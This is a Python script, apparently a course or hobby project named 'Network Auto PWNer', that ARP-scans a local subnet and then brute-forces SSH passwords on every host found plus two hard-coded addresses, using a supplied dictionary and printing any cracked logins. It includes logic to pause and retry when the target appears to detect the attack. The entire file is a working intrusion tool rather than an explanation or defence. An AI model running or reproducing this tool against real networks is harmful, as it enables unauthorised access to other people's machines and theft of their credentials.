#! ../venv/bin/python3
import argparse
import socket
import time
import os

import scapy.all as scapy
from paramiko import ssh_exception
from scapy.layers.l2 import Ether, ARP
import paramiko

extra_targets = ["192.168.8.1", "192.168.8.2"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

# Custom function to beautify colors. Syntax: cprint("hello", color="green")
def cprint(*args, color="white", **kwargs):
    d = {"red": "\u001b[31m", "black": "\u001b[30m", "green": "\u001b[32m", "yellow": "\u001b[33m",
         "blue": "\u001b[34m", "white": "\u001b[37m", "end": "\u001b[0m"}

    if color not in d:
        for k in d:
            if color in k:
                color = k
                break
        else:
            color = "white"

    print(d[color], *args, d["end"], **kwargs)
# some cool staff is here!



def get_args():
    parser = argparse.ArgumentParser("\nNetwork Auto PWNer \nv1.33.7\n")
    parser.add_argument("-d", "--dictionary", help="password dictionary", required=True)
    parser.add_argument("-l", "--login", help="login for bruteforce", required=True)
    parser.add_argument("-p", "--port", help="use non-standard port for ssh brute", default=22)
    parser.add_argument("-a", "--address", required=True)
    parser.add_argument("-i", "--interface")
    return parser.parse_args()



def scan(ips, iface):
    cprint("\b[NETWORK SCAN]", color="yellow")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst=ips)  #10.0.2.1 / 24
    packet = ether / arp
    ans, _ = scapy.srp(packet, timeout=5, iface=iface)
    return ans

def show_res(ans):
    print("="*60)
    for t in ans:
        cprint(f"[+] MAC: {t[1].hwsrc} IP: {t[1].psrc}", color="green")
    #print("[+] OK")

def set_targets(ans):
    victims = []
    for t in ans:
        victims.append(t[1].psrc)
    victims.extend(extra_targets)
    return victims


# Try single pair of creds on target
def connect_ssh(host, user, pas, port):
    try:
        ssh.connect(hostname=host, username=user, password=pas, banner_timeout=200, timeout=30, port=port)
        cprint(f"\n[+] Success! Used credentials: {user} {pas}", color="green")
        return [1, user, pas]
    except paramiko.AuthenticationException:    # Creds are incorrect
        print(f"[-] {user} {pas}")
        return [0, ]
    except TimeoutError:                        # To prevent script crashes
        cprint("[ERR] Server is not respondong", color="red")
        return [2, ]
    except socket.timeout:                      # To avoid another reason for script to crash
        cprint("[ERR] Server is not respondong", color="red")
        return [2, ]
    except ssh_exception.NoValidConnectionsError:   # Yet another thing that used to crash script
        cprint("[ERR] Server is not available!", color="red")
        return [2, ]
    except KeyboardInterrupt:                   # You wanna skip some targets, don't you?
        cprint("\n\n[!] Target skipped", color="yellow")
        return [3, ]
    except paramiko.SSHException:               # Well, this is real pain in... Server will drop us after several failed attempts or something
        cprint("[!] We'd been detected! Need to take cover for 30 sec...", color="yellow")
        time.sleep(30)
        cprint("[!] Ok, we're clear", color="yellow")
        return connect_ssh(host, user, pas, port)   # And if this happened, we want script to repeat with dropped log-pass

# Run bruteforce against single target
def brute_single_ssh(host, user, port, file):
    dict = open(file, 'r')
    clog = None
    cpas = None
    for line in dict:
        #print("[?]",user, line.strip())
        flag = connect_ssh(host, user, line.strip(), port)
        if flag[0] == 1:
            #print("single_ssh() found!")
            clog = flag[1]
            cpas = flag[2]
            #print(clog, cpas)
            break
        if flag[0] in [2, 3]:
            #print("single_ssh() error")
            break
        time.sleep(3)
    dict.close()
    return [clog, cpas]

# Run bruteforce against several targets
def brute_all_ssh(targets, user, port, file):
    cprint(f"\n\n\n[SSH BRUTE TARGETS]", color="yellow")
    for i in targets: print(i)
    print("\npress CTRL + C to skip target")
    final = []
    for t in targets:
        cprint(f"\n[*] Now {t} is under attack!", color="yellow")
        creds = brute_single_ssh(t, user, port, file)
        if creds[0] != None:
            #print(f"brute_all creds for this one: {creds[0]}, {creds[1]}")
            final.append((t, port, creds[0], creds[1]))
    cprint("\n\b[DONE]", color="yellow")
    return final

# Print found creds in pretty shape
def print_ssh(result):
    cprint("\n\n[FOUND CREDS]", color="yellow")
    if not result:
        cprint("[-] No creds found!", color="red")
    for r in result:
        if r[1] != 22:
            cprint(f" [+] {r[2]}@{r[0]} -p {r[1]}\t{r[3]}\n", color="green")
        else:
            cprint(f" [+] {r[2]}@{r[0]}\t{r[3]}\n", color="green")


if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    cprint("""\b░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░█▀▀░▀█▀░█▀█░█▀█░█░░░░░█▀█░█░█░▀█▀░█░█░█▀█░█▀█░░
░░█▀▀░░█░░█░█░█▀█░█░░░░░█▀▀░░█░░░█░░█▀█░█░█░█░█░░
░░▀░░░▀▀▀░▀░▀░▀░▀░▀▀▀░░░▀░░░░▀░░░▀░░▀░▀░▀▀▀░▀░▀░░
░░▀█▀░█▀█░█▀▀░█░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█░░█▀█░▀▀█░█▀▄░░░░░░░░By Scan-87░░░░░░░░░░░░░░
░░░▀░░▀░▀░▀▀▀░▀░▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    """, color="green")
    options = get_args()
    res = scan(options.address, options.interface)
    show_res(res)

    targets = set_targets(res)
    result = brute_all_ssh(targets, options.login, options.port, options.dictionary)
    print_ssh(result)